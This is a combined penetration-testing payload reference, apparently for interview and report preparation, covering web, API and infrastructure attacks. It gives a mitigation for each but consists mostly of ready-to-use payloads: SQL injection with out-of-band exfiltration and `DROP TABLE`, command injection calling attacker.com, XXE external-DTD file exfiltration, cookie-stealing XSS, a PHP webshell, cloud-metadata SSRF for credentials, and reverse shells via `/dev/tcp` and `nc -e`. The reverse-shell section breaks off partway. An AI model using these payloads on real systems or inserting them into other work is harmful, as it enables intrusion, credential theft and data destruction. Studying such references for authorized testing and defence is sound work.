# Payload & Exploitation Reference

A single, combined payload reference for web, API, mobile and infrastructure testing. For each vulnerability it gives the **payloads**, **how** they work, and **when/why** you reach for a given variant, then the **mitigation**. Lead your answers with the reasoning - interviewers and reports want "why *that* payload, in *that* situation", not just the string.

Companion files: process and checklists in the `*-security-testing.md` files; the tool inventory in [tools-reference.md](tools-reference.md). Use only against targets you own or are explicitly authorized to test.

**The meta-answer (use this framing every time):** 1) the context/signal that makes you reach for the payload -> 2) the payload and how it works mechanically -> 3) which variant and why -> 4) impact -> 5) mitigation (real fix first, then defence-in-depth).

---

# PART 1 - INJECTION

## 1. SQL Injection (SQLi)

**Mental model:** your input breaks out of the data context and becomes part of the SQL command. Everything below is about *confirming* that, then *extracting* data based on *what the app shows back*.

**Entry points:** URL parameters, POST data, HTTP headers (`User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`), JSON/XML fields, and the `ORDER BY` clause.

### 1.1 Detection / confirmation
| Payload | How it works | When/why |
|---|---|---|
| `'` or `"` | Breaks string quoting -> DB syntax error | First probe; a SQL error = likely injectable |
| `' OR '1'='1` | Makes the WHERE clause always true | **Auth bypass** / return all rows - login forms, filters |
| `' AND '1'='2` vs `' AND '1'='1` | One false, one true | **Boolean-blind** - no error/data, but behaves differently |
| `'||(SELECT '')||'` | String concatenation (Oracle/Postgres) | Confirm injection on `||` DBs |
| `1-1` vs `2-1` in a numeric param | If `id=2-1` == `id=1`, math ran server-side | Confirm **numeric** injection (no quotes to break) |
| `AND 1=1` vs `AND 1=2` | Differential response | Generic boolean confirm |
| `SLEEP(5)` / `WAITFOR DELAY '0:0:5'` | Time delay | Confirm when there is no visible output |
| OAST payload (DNS/HTTP callback) | Out-of-band interaction | Confirm OOB when no in-band channel |
| Second-order | Store via registration/profile, trigger via another query | Payload executes later in a different query |

### 1.2 OR vs AND vs UNION vs blind - the reasoning
- **`OR`** - force a condition TRUE to pull data **out**: authentication bypass or return all rows. `admin' OR '1'='1' --` logs in regardless of password. Use when the app *acts on* the row.
- **`AND`** - **blind inference**, yes/no questions. The row already returns; append `AND <condition>` and watch if the normal result still appears. `' AND 1=1 --` (normal) vs `' AND 1=2 --` (changes) proves control, then swap in a real question: `' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --`. Use when data isn't shown directly.
- **`UNION`** - only when the app **reflects query results on the page**. Appends a second SELECT whose columns print in place of the original data. If nothing is shown, UNION is useless -> fall back to blind.
- **Blind** - when there is no visible difference at all; infer via boolean, time, or OOB.

One-liner: *"OR breaks authentication or dumps everything by forcing truth; AND is for blind extraction, appending a condition to an already-returning row; UNION works only when results are reflected and column count/types match."*

### 1.3 UNION workflow (ordered)
1. **Column count** - `' ORDER BY 1-- -` ... increase until error (last working number = count); or `' UNION SELECT NULL-- -`, `...NULL,NULL-- -` until no error.
2. **Visible / string columns** - `' UNION SELECT 'a',NULL,NULL-- -` -> see where `a` appears.
3. **Extract** - `' UNION SELECT username,password,NULL FROM users-- -`.

### 1.4 Error-based payloads
```sql
' AND extractvalue(1,concat(0x7e,database()))-- -        -- MySQL DB name
' AND updatexml(1,concat(0x7e,version()),1)-- -          -- MySQL version
' AND 1=convert(int,@@version)-- -                       -- MSSQL
' AND 1=cast(version() as int)-- -                       -- PostgreSQL
' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -  -- Oracle
```

### 1.5 Union-based payloads
```sql
' ORDER BY 1-- -  ...  ' ORDER BY N-- -                   -- find column count
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -                                 -- which columns display
' UNION SELECT 1,2,database()-- -
' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username, password FROM users-- -
' UNION SELECT username||'~'||password FROM users-- -    -- combine values in one column
```
DB version by engine: `@@version` (MySQL/MSSQL), `version()` (Postgres).
Schema: list DBs `information_schema.schemata`; tables `information_schema.tables`; columns `information_schema.columns`.

### 1.6 Boolean-based blind
```sql
' AND 1=1-- -                                            -- true (normal page)
' AND 1=2-- -                                            -- false (different response)
' AND (SELECT 'a' FROM users LIMIT 1)='a                 -- confirm table exists
' AND SUBSTRING(database(),1,1)='a'-- -                  -- extract char-by-char
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1-- -
```

### 1.7 Time-based blind
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)-- -
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5'-- -
-- PostgreSQL
' AND (SELECT pg_sleep(5))-- -
' AND CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) ELSE 0 END-- -
-- Oracle
' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -
```

### 1.8 Error-based blind (conditional)
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   -- error = true (division by zero)
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   -- no error = false
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- - -- leak value in error
```

### 1.9 Out-of-band (OOB)
```sql
-- MySQL
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
-- MSSQL
'; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
'; EXEC master..xp_dirtree '\\attacker.com\x'-- -
-- Oracle
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
```

### 1.10 Stacked queries
```sql
'; DROP TABLE users-- -
'; EXEC xp_cmdshell 'dir'-- -                            -- MSSQL OS command / RCE
'; INSERT INTO users VALUES('hacker','pass')-- -
'; SELECT * FROM users INTO OUTFILE '/tmp/out.txt'-- -   -- MySQL file write (webshell)
```

### 1.11 WAF bypass / filter evasion
```sql
' aNd 1=1-- -                  -- case variation
'/**/AND/**/1=1-- -            -- comment splitting
'/*!50000AND*/ 1=1-- -         -- MySQL version comments
se/**/lect   /   UN/**/ION     -- split keywords
uNiOn SeLeCt                   -- mixed case
UNION(SELECT(1))               -- whitespace via parentheses
%27%20AND%201%3D1--%20-        -- URL encoding
%2527%2520AND%25201%253D1      -- double URL encoding
0x61646d696e                   -- hex ('admin')
' AND 'a'='a'                  -- concatenation
```

### 1.12 Basic auth-bypass quickies
```
Abcd'--        Abcd'+OR+1=1--        user'--        admin'--
```

### 1.13 Injection location & sqlmap
Injection can live in `WHERE` (most common), `UPDATE`/`INSERT` values, table/column names (needs whitelist bypass), and `ORDER BY` (`?sort=price'`).
```bash
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C user,pass --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --dump
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --os-shell
sqlmap -r request.txt --batch --dbs
```
**Mitigation:** parameterised queries / prepared statements (the real fix), ORM with proper binding, least-privilege DB account, input validation, safe stored procedures, WAF as defence-in-depth only. Escaping (`mysqli_real_escape_string`) is not equivalent to parameterisation.

---

## 2. NoSQL Injection
Operator injection changes query meaning. Reach for it on JSON APIs over MongoDB/CouchDB.
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}}
```
```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
```
`$where` enables server-side JS execution. **Mitigation:** cast/validate input to expected type, use safe query builders (don't pass raw request objects), disable `$where`/`mapReduce`, least privilege.

---

## 3. OS Command Injection
Append your own command with a shell metacharacter; anywhere the app likely shells out (ping tools, converters, PDF/image processing, export).

**Separators:** cross-platform `&`, `&&`, `|`, `||`; Unix-only `;`, `\n` (0x0A), `` `cmd` ``, `$(cmd)`; Windows chain `& cmd`.
```bash
; id            | id            && id            || id
`id`   $(id)    & whoami (Windows)
; whoami        ; cat /etc/passwd        ; curl http://attacker.com/$(whoami)
& ping -c 5 attacker.com
```
**Filter / WAF bypass:**
```bash
cat${IFS}/etc/passwd          # ${IFS} replaces a blocked space
cat</etc/passwd               # redirection instead of a space
c''at /etc/pa""sswd           # empty quotes split the keyword
w\ho\am\i                     # shell-ignored backslashes
$(printf '\x69\x64')          # hex-encoded "id"
{cat,/etc/passwd}             # brace expansion (no space needed)
```
**Blind (no output):** time delay `; sleep 10` / `$(sleep 5)`; OOB `; nslookup attacker.com` / `; curl http://attacker.com`. Test via Referer/User-Agent headers, filename fields, image-processing uploads.
**Mitigation:** avoid shell calls (use language APIs), pass args as an array (no shell interpolation), strict allow-list / numeric-only / alphanumeric-only validation. Never rely on escaping metacharacters.

---

## 4. LDAP Injection
Wildcard/filter break for auth bypass or directory enumeration. When: LDAP-backed login/lookup.
```
*)(uid=*))(|(uid=*
admin)(&)
*()|%26'
*                 -- wildcard matches any entry
' or '1'='1
```
**Mitigation:** escape LDAP special characters (RFC 4515), parameterised/framework LDAP APIs, allow-list input, least-privilege bind account.

---

## 5. XML Injection
Inject XML metacharacters/tags to change document structure (price/role tampering, tag injection). Chains into XXE. When: input embedded into XML/SOAP/config.
```xml
</price><price>0</price>
"><injected>value</injected>
<!-- close/reopen elements to add privileged fields -->
```
**Mitigation:** encode user data in XML, build with safe serialisers, validate against XSD, disable external entities.

---

## 6. XPath Injection
Auth bypass and full XML-document extraction (no comments, no row-level access control). When: app authenticates/looks up against an XML store.
```
' or '1'='1
' or ''='
x' or name()='username' or 'x'='y
-- blind: substring() + string-length() boolean tests to extract char-by-char
```
**Mitigation:** parameterised (precompiled) XPath with variable binding, escape/validate input, prefer a real DB with access control.

---

## 7. Expression Language (EL) / OGNL Injection
Server-side expression evaluated -> reaches Java objects/methods; close cousin of SSTI. When: Spring SpEL, JSF, Struts OGNL built from request data.
```
${7*7}    #{7*7}    %{7*7}      -- probe; "49" means evaluated
-- escalate to RCE via Runtime (OGNL/SpEL), e.g. the Struts Content-Type RCE class (CVE-2017-5638)
```
**Mitigation:** never evaluate user input as an expression; keep request data out of EL contexts; patch Struts/Spring; sandbox/allow-list if dynamic expressions are required.

---

## 8. Server-Side Template Injection (SSTI)
User input concatenated into a server-side template; often -> RCE. Signal: input lands somewhere *rendered* (email templates, dashboards, personalised pages).

**Detect (engine-agnostic -> fingerprint):**
```
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  *{7*7}     -- "49" = evaluated
{{7*'7'}} -> 7777777 (Jinja2) vs 49 (Twig)      -- fingerprints engine
```
**Exploit by engine:**
```
# Jinja2 / Flask (Python) - RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}                       # enumerate classes
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}              # shorter modern
{{config}}                                                           # dump Flask config
# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${class.getResource('/').getPath()}                                  # path disclosure
# ERB (Ruby)
<%= `id` %>   <%= system('id') %>   <%= IO.popen('id').read %>
# Velocity (Java)
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
# Smarty (PHP)
{system('id')}        {php}system('id');{/php}
# Mako (Python)
${self.module.cache.util.os.system("id")}
# Razor (.NET)
@{ System.Diagnostics.Process.Start("cmd.exe","/c id"); }
```
Tool: `tplmap`. **Mitigation:** don't pass user input into templates; logic-less/sandboxed templates; pass data as variables, not template source.

---

## 9. XXE (XML External Entity)
App parses attacker XML with external entities enabled -> declare an entity pointing at a file/URL and the parser fetches it. Signal: app accepts XML (SOAP, SAML, `.docx`/`.svg`/`.xml` uploads, `Content-Type: application/xml`). Change `Content-Type` to `text/xml`/`application/xml` to test.
```xml
<!-- File read (classic; app reflects parsed values) -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

<!-- SSRF via XXE (pivot to internal / cloud metadata) -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service/"> ]>

<!-- Blind / OOB (nothing reflected -> external DTD exfiltrates over HTTP/DNS) -->
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>

<!-- XInclude (when you can't control the whole document) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Attacker-hosted external DTD for blind OOB exfiltration (`evil.dtd` referenced above):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```
Billion laughs = nested entity expansion -> DoS (availability variant). **Mitigation:** disable DTD / external-entity resolution in the parser; prefer JSON; validate against schema.

---

## 10. CRLF Injection (HTTP Response Splitting)
Inject `%0d%0a` into a value used in a header/response -> add headers, split the response, poison cache, set cookies.
```
user=Alice%0D%0ASet-Cookie:session=malicious
%0d%0aLocation: https://evil.com
```
**Mitigation:** strip/reject CR/LF in header-bound input; use framework header APIs; validate to a safe charset.

---

## 11. SMTP / Email Header Injection
Inject CRLF + SMTP headers into email-building fields (contact forms, invite, reset) -> add recipients/headers, spam/phishing from the trusted domain.
```
victim@mail.com%0aCC:hacker@mail.com
victim@mail.com%0aBcc:attacker@example.com
victim@mail.com%0a%0dcc:hacker@mail.com
```
**Mitigation:** strip CR/LF, use a mail library that builds headers safely, validate addresses.

---

## 12. Other injection quick-hits
**HTTP header injection:**
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Original-URL: /admin
X-HTTP-Method-Override: DELETE
```
**HTML injection:**
```html
<h1>Injected</h1>
<iframe src="http://attacker.com"></iframe>
```
**SSI injection (Server-Side Includes):**
```
<!--#exec cmd="whoami" -->
<!--#include file="../../etc/passwd" -->
<!--#printenv -->
```
**SOAP injection:** inject XML/SOAP payloads (XXE or SQLi) into SOAP parameters; test SOAPAction spoofing.

---

## 13. Insecure Deserialization
App deserializes attacker-controlled serialized data; a crafted object triggers code execution via gadget chains. Signal: base64 blobs decoding to serialized structures, cookies like `rO0...`, `Content-Type` naming a serialization format.
- **Java** - magic bytes `AC ED 00 05` / base64 `rO0`. Tool **ysoserial** (`CommonsCollections1`, ...). `Content-Type: application/x-java-serialized-object`.
- **PHP** - `unserialize()` on input; `O:4:"User":1:{s:4:"name";s:5:"admin";}` abusing `__wakeup`/`__destruct`. Tool **PHPGGC**.
- **Python** - `pickle.loads()`; a pickle with `__reduce__` returning `os.system('id')`.
- **.NET** - ViewState / BinaryFormatter; tool **ysoserial.net**.

Check `__wakeup`, `__destruct`, `readObject` gadget chains. **Impact:** usually RCE. **Mitigation:** never deserialize untrusted data; data-only formats (JSON) + schema validation; signed/encrypted serialization; allow-list classes.

---

# PART 2 - CROSS-SITE & CLIENT-SIDE

## 14. Cross-Site Scripting (XSS)
Input reflected into a page and executed as script. **The context your input lands in dictates the payload** - that context-awareness is the whole game. One-liner: *"I identify the context first (HTML body, attribute, JS string, URL, or DOM sink), because that dictates what I break out of."*

**Context -> payload:**
- HTML body -> `<script>alert(1)</script>` or `<svg onload=alert(1)>`
- Inside an attribute `value="HERE"` -> break out: `"><svg onload=alert(1)>` (single-quoted: `'><script>alert(1)</script>`)
- Inside a JS string `var x='HERE'` -> `';alert(1)//`
- Inside a URL/`href` -> `javascript:alert(1)`
- DOM sink (`innerHTML`, `document.write`, `eval`, `location`) -> DOM-based; never touches server

**Reflected** - in the request, echoed back; needs victim to click a crafted link. Test every entry point (search, forms, headers `User-Agent`/`Referer`, cookies, URL params) with a unique marker, find reflection context, break out.
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
javascript:alert(1)
`${alert(1)}`
<svg><animatetransform onbegin=alert(1)></svg>
\"-alert(1)}//
%22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E
<link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)">
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click</text></a></svg>
<!-- AngularJS sandbox escapes -->
{{constructor.constructor('alert(1)')()}}
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```
**Stored** - saved server-side (comment, bio, filename, address), runs for every viewer, higher severity.
```html
<script>alert('stored')</script>
<img src=x onerror=alert('stored')>
<svg/onload=alert('stored')>
<a href="#" onclick="alert('stored')">Click</a>
```
**DOM-based** - source (`location`, `document.URL`, `document.referrer`, `location.hash`) -> sink (`innerHTML`, `document.write`, `eval`, `URLSearchParams`).
```
#?name=<img src=x onerror=alert(1)>
```
**Filter bypass:**
```html
<ScRiPt>alert(1)</sCrIpT>
<script>ale\u0072t(1)</script>
<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>
jaVaScRiPt:alert(1)
<img src=x onerror=alert(1)//
```
**Polyglot (one string that fires across many contexts):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloaD=alert()//>\x3e
```
**Real-impact (for "what's the actual risk"):**
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
<script>new Image().src='//attacker.com/?c='+document.cookie</script>   <!-- only if no HttpOnly -->
```
Impact in triage = account takeover / actions as the victim / token theft, not "alert box". **Mitigation:** context-aware output encoding, CSP, `HttpOnly` cookies, input validation, framework auto-escaping, DOMPurify for rich HTML, `X-Content-Type-Options: nosniff`.

---

# PART 3 - NON-INJECTION (equally important)

## 15. CSRF
No "string" - the exploit is a crafted page that makes the victim's browser fire an authenticated state-changing request, abusing auto-sent cookies.
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```
GET variant: `<img src="https://bank.com/transfer?to=attacker&amount=10000">`
**Valid when:** state-changing action AND cookie-only auth AND no anti-CSRF token / no `SameSite`. Test: remove the token / resubmit cross-origin - still works = valid. Severity: logout = low; password/email change ( -> ATO) = high. **Mitigation:** anti-CSRF tokens, `SameSite=Lax/Strict`, verify Origin/Referer, re-auth for sensitive actions.

## 16. SSRF
You control a URL the *server* fetches; point it inward. When: webhooks, "import from URL", image/PDF fetch, SSO metadata, `Referer`-based fetch.
```
http://127.0.0.1        http://localhost        http://[::1]/
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS creds (crown jewel)
http://169.254.170.2/v2/credentials/            # ECS
http://metadata.google.internal/                # GCP (header: Metadata-Flavor: Google)
http://127.0.0.1:8080/admin                     # internal admin
http://internal-host:3306                       # internal service / port scan
file:///etc/passwd                              # if file:// allowed
dict://127.0.0.1:11211/stats                    # Memcached
gopher://127.0.0.1:6379/_*1%0d%0a...            # Redis
```
**Filter bypasses:** `http://127.1`, `http://0.0.0.0`, decimal/octal/hex `http://2130706433`, `http://0x7f000001`, IPv6 `[::1]`, DNS rebinding, redirect from your own server to an internal IP, `@` confusion, `#` tricks.
**Blind SSRF:** no body -> confirm with OAST (Burp Collaborator). **Mitigation:** outbound allow-list, block link-local/private ranges, disable unused schemes, enforce IMDSv2, network segmentation, don't reflect fetched content.

## 17. IDOR / Broken Access Control
Change an identifier; the server fails to check ownership. A technique, not a payload.
- Increment/decrement IDs: `/api/user/1001/invoice` -> `1000`, `1002`
- Swap UUIDs/IDs captured from a second account
- `role=user` -> `role=admin` (mass-assignment-adjacent)
- Method/endpoint swap: `GET` allowed -> try `PUT`/`DELETE`
- Parameter in body/JSON/cookie, not just URL; IDOR in body/header more likely than in URL, e.g. `{"id":{"id":111}}`
**Proof (gold standard): two accounts.** Log in as A, capture a request to A's object, replay with B's session (or B's id). A reads/modifies B's data -> confirmed. Severity scales with data sensitivity. **Mitigation:** server-side object-level authorization on every request; don't rely on unguessable IDs; centralised access checks; use `/me/...` not `/user/<id>/...`; UUIDs not auto-increment.

## 18. Authentication / Session / JWT / OAuth
**JWT:**
```
alg:none          -- set header {"alg":"none"}, strip signature -> forge any token if accepted
weak secret       -- brute HS256 secret then re-sign as admin:
hashcat -a 0 -m 16500 <token> <wordlist>
kid injection     -- path traversal / SQLi in the key id
jku / x5u         -- point to attacker-hosted key
RS256 -> HS256       -- algorithm confusion: sign with the RSA public key as the HMAC secret
```
Also: check `exp` (use expired token), token reuse after logout, refresh-token reuse, tamper `sub`/`role`/`user_id`. Fix: verify signature + pin alg server-side, validate `exp`/`aud`/`iss`.
**OAuth:** `redirect_uri` manipulation to steal the `code` (chain with open redirect), missing `state` (CSRF on callback), token leak via `Referer`, implicit flow token in URL. Fix: strict redirect allow-list, verify `state`, PKCE.
**Brute/stuffing:** no rate limit on login/OTP; reset-token weaknesses; `cewl <url> -m 6 > wordlist.txt` for a site-specific wordlist.

## 19. File Upload -> RCE
Upload a webshell and browse to it.
```php
shell.php -> <?php system($_GET['c']); ?>
```
**Bypasses:** double extension `shell.php.jpg`; null byte `shell.php%00.jpg` (legacy); content-type spoof (`Content-Type: image/png` on a PHP shell); magic-byte prefix (`GIF89a;<?php...`); alt extensions `.phtml`/`.php5`/`.phar` when `.php` blocked; case `shell.pHp`; `.htaccess` upload to remap handlers; polyglot (valid image + script); payload/path-traversal in filename (`<script>alert(1)</script>.jpg`, `../../evil.php`), EXIF-embedded payloads; EICAR to test AV; ImageTragick. When: upload is web-accessible and server-executable. **Mitigation:** allow-list extension + content-type + **magic bytes**, store outside webroot, randomise names, serve from a non-executing domain, `Content-Disposition: attachment`, `nosniff`.

## 20. Path Traversal / LFI / RFI
```
../../../../etc/passwd
..%2F..%2F..%2Fetc/passwd                   # URL-encoded
..%252F..%252Fetc/passwd                    # double-encoded
....//....//etc/passwd                      # filter-stripping bypass
..\..\..\windows\win.ini                    # Windows
/etc/passwd%00.jpg                          # null byte (legacy)
php://filter/convert.base64-encode/resource=index.php   # LFI source read
data://   expect://id                       # LFI -> RCE wrappers
http://attacker.com/shell.txt               # RFI -> RCE
```
LFI reads/executes local files ( -> RCE via log poisoning/wrappers); RFI pulls a remote file. When: `file`/`page`/`include`/`download` params. **Mitigation:** canonicalise + allow-list, no user input in file paths, disable remote inclusion.

## 21. Open Redirect, Clickjacking, CORS
**Open redirect** - params `?next= ?url= ?redirect= ?return= ?to= ?dest=`:
```
/login?next=https://attacker.com
/login?next=//attacker.com
/login?next=/\attacker.com
/login?next=https://trusted.com@attacker.com
/login?next=javascript:alert(1)
/login?next=%2F%2Fattacker.com
```
Impact alone = low; chains into OAuth token theft / phishing. **Clickjacking** - PoC HTML iframing the target with `opacity:0` over a decoy; valid only if `X-Frame-Options`/`frame-ancestors` missing AND a sensitive one-click action exists. **CORS** - send `Origin: https://evil.com`; if reflected in `Access-Control-Allow-Origin` **with** `Access-Control-Allow-Credentials: true`, evil.com reads authenticated data; also test `null` origin and weak allow-list regex. ACAO `*` without credentials/sensitive data = low.

## 22. HTTP Request Smuggling
Desync between front-end and back-end on request boundaries. Variants: **CL.TE**, **TE.CL**, **TE.TE** (obfuscated `Transfer-Encoding`), **CL.CL**, **HTTP/2 -> 1 downgrade**. Test both `Content-Length` and `Transfer-Encoding: chunked` in one request. Tools: `smuggler.py`, Burp HTTP Request Smuggler. **Impact:** auth/WAF bypass, request hijacking, cache poisoning. **Mitigation:** consistent strict parsing, never allow both CL and TE, prefer HTTP/2 end-to-end.

## 23. Web Cache Poisoning
Make a cache store a malicious response under a normal URL. Vectors: `X-Forwarded-Host`/`X-Forwarded-Scheme`, unkeyed params/headers reflected in the response, `Vary` gaps, HTTP method confusion, encoding tricks (`/%2e%2e/admin`), cookie bombing, `Cache-Control` abuse, open-redirect poisoning, query-parameter pollution.
Steps: 1) identify cache keys (remove params, watch `X-Cache: HIT`); 2) find unkeyed inputs reflected in response; 3) inject payload -> request twice -> confirm cached; 4) confirm it serves to other users (Collaborator). Also: **web cache deception** (`/account.php/nonexistent.css` cached as static, leaking private data). **Mitigation:** strict cache keys, correct `Cache-Control`/`Vary`, don't reflect unkeyed input, `no-store` on authenticated responses.

## 24. Composite outcomes (reached by chaining)
- **RCE** - via command injection, SQLi (`xp_cmdshell`/`INTO OUTFILE`), deserialization, SSTI/EL, upload, LFI/RFI, SSRF -> internal service. Confirm with a benign `id`/delay/OAST callback first.
- **Account Takeover** - no-rate-limit brute force, host-header reset poisoning, IDOR on reset/email, CSRF on email/password change, XSS session theft, OAuth code theft, JWT forgery, response manipulation on OTP. The craft is chaining a low-severity bug into another.
- **Defacement** - stored XSS/SSTI, cache poisoning, upload/RFI overwrite, SQLi on displayed records, subdomain takeover.
- **Subdomain Takeover** - dangling DNS (CNAME to a deprovisioned GitHub Pages/Heroku/S3/Azure resource) -> register it and serve content on the trusted subdomain.
- **DNS Rebinding** - low-TTL domain rebinds to an internal IP after load, defeating SOP's host check -> reach internal services from the victim's browser.

---

## 25. GraphQL-specific attacks
When the endpoint is `/graphql` (`/v1/graphql`, `/api/graphql`). Map the schema first, then abuse it.
- **Introspection** (dump the whole schema):
```json
{"query":"{__schema{types{name fields{name type{name}}}}}"}
{"query":"{__schema{queryType{name} mutationType{name}}}"}
```
- **Field suggestion** - even with introspection off, a typo returns "Did you mean ...", leaking field names.
- **Batching / aliasing** (brute force, rate-limit bypass) - many operations in one request:
```json
[{"query":"mutation{login(u:\"a\",p:\"1\"){token}}"},{"query":"mutation{login(u:\"a\",p:\"2\"){token}}"}]
{"query":"{a:login(p:\"1\"){t} b:login(p:\"2\"){t} c:login(p:\"3\"){t}}"}
```
- **Nested-query DoS** - deeply nested relations (`a{b{a{b...}}}`) exhaust the server; test depth/complexity limits.
- **Injection** - string args reach SQL/NoSQL sinks; test the usual injection inside arguments.
- **Authz/IDOR** - query objects by id through a query the UI never exposes.
**Mitigation:** disable introspection + field suggestion in prod, depth/complexity/cost limits, disable or cap batching, per-resolver authorization, rate limiting.

## 26. Host Header Injection
The app trusts `Host` (or `X-Forwarded-Host`) to build links or route.
```
Host: attacker.com                 # password-reset poisoning: reset email link -> your server
X-Forwarded-Host: attacker.com     # when Host is validated but XFH is not
X-Host: attacker.com   X-Forwarded-Server: attacker.com
```
- **Reset poisoning** - the reset link is built from Host; victim clicks it, token hits your server.
- **Routing-based SSRF** - a reverse proxy routes by Host to internal vhosts.
- **Cache poisoning / open redirect** via a reflected Host.
Test: change the header and watch for it in the response body, a redirect, or an email. **Mitigation:** validate Host against an allow-list, build absolute URLs from server config (not the request), only trust `X-Forwarded-*` from a known proxy.

## 27. HTTP Parameter Pollution (HPP) & Mass Assignment
**HPP** - send a parameter twice; stacks disagree on which wins, bypassing validation/WAF or hitting a second code path:
```
price=100&price=1            # first-vs-last-wins differs per framework
role=user&role=admin
/transfer?from=A&from=B&amount=1
```
**Mass assignment / autobinding** - add fields the UI never sends; the framework binds them to the model:
```json
{"username":"bob","password":"x","is_admin":true}
{"user":"bob","balance":999999,"role":"admin","verified":true}
```
Try `isAdmin`, `role`, `verified`, `id`, `account_id`, `price`. **Mitigation:** explicit allow-list of bindable fields (DTOs), server-side authorization on privileged fields, normalise/reject duplicate params.

## 28. Prototype Pollution (JavaScript / Node)
Inject `__proto__` so a merge/clone pollutes `Object.prototype`, affecting every object -> logic bypass, DoS, or Node RCE (gadget-dependent).
```
# client-side (URL/JSON merged into config)
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
# server-side (JSON body into a vulnerable merge/clone)
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"polluted":"yes"}}}
```
Confirm: set a junk property, read it on an unrelated object (`({}).polluted`). **Impact:** auth/logic bypass; RCE via gadgets (e.g. `child_process` options). **Mitigation:** `Object.freeze(Object.prototype)`, reject `__proto__`/`constructor`/`prototype` keys, `Map`/`Object.create(null)`, safe merge libraries.

## 29. CSV / Formula (Spreadsheet) Injection
Exported data opening in Excel/Sheets executes cells starting with `= + - @`. When user input lands in an exported CSV/XLSX.
```
=1+1                                     # confirm formulas execute
=cmd|'/c calc'!A1                        # command exec via legacy DDE
=HYPERLINK("http://attacker.com?"&A1,"click")   # exfil other cells
@SUM(1+1)*cmd|'/c calc'!A0
```
**Mitigation:** prefix a leading `= + - @ \t \r` with a single quote/space on export, quote all fields, warn on import.

---

# PART 4 - SHELLS & POST-EXPLOITATION PAYLOADS

## 30. Reverse & bind shells
After RCE (cmdi, upload, deserialization, SSTI/EL) get an interactive shell. Start a listener first: `nc -lvnp 4444` (or `rlwrap nc -lvnp 4444`).
**Reverse shells (call back to ATTACKER:4444):**
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
# Netcat (with -e, or the mkfifo form when -e is unavailable)
nc ATTACKER 4444 -e /bin/sh
